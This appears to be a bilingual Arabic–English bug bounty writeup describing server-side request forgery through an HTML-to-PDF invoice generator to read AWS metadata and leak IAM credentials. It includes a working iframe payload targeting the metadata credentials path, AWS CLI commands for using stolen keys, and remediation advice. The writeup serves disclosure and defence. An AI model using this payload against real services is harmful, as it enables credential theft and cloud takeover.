اختراق السحابة عبر ثغرات SSRF المتقدمة

Cloud SSRF: Leaking AWS Metadata Keys via PDF Generator

HIGH Bounty: $4,000

Overview / نظرة عامة

AR

تعتبر ثغرة Server-Side Request Forgery (SSRF) خطيرة جداً خاصة في البيئات السحابية. يوضح هذا التقرير كيف أدى استغلال محرك توليد ملفات PDF ضعيف إلى تسريب مفاتيح AWS السحابية (IAM Secrets) واختراق البنية التحتية بالكامل.

EN

Server-Side Request Forgery (SSRF) represents a severe risk in cloud deployments. This writeup illustrates how exploiting a vulnerable HTML-to-PDF generator leaked AWS metadata server credentials, leading to total cloud takeover.

Attack Steps / خطوات الاستغلال

  1. اكتشاف محرك توليد فواتير PDF يقبل مدخلات HTML من المستخدم.
  2. حقن كود HTML يحتوي على <iframe src="http://169.254.169.254/latest/meta-data/"> داخل الطلب.
  3. السيرفر يقوم بتشغيل محاكي المتصفح (Headless Browser) ويجلب البيانات السحابية ثم يطبعها داخل الـ PDF الناتج.
  4. استعراض المجلدات السحابية والوصول لـ iam/security-credentials/[role] لاستخراج مفاتيح الوصول الحساسة.
  5. استخدام واجهة سطر أوامر AWS السحابية (AWS CLI) للتحكم بالنظام بالكامل باستخدام المفاتيح المسربة.

Payload & Exploit Commands / الحمولة وأوامر التحكم

HTML iframe Injection Payload / حمولة حقن الإطار 
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" width="600" height="400"></iframe>
AWS CLI Config / تكوين واجهة سطر الأوامر للاستغلال 
export AWS_ACCESS_KEY_ID=ASIAXX...
export AWS_SECRET_ACCESS_KEY=wJalrX...
export AWS_SESSION_TOKEN=IQoJb3...
aws sts get-caller-identity

Remediation / التخفيف والحماية

AR

قم بتفعيل النسخة الثانية من خدمة البيانات السحابية IMDSv2 التي تتطلب ترويسات مصادقة مسبقة (Token-based Headers)، وعطل الاتصال بالشبكات المحلية من سيرفر توليد الملفات.

EN

Harden cloud servers by enforcing AWS IMDSv2 (which requires token headers to block SSRF), and apply local network firewalls to restrict outbound traffic from PDF engines.
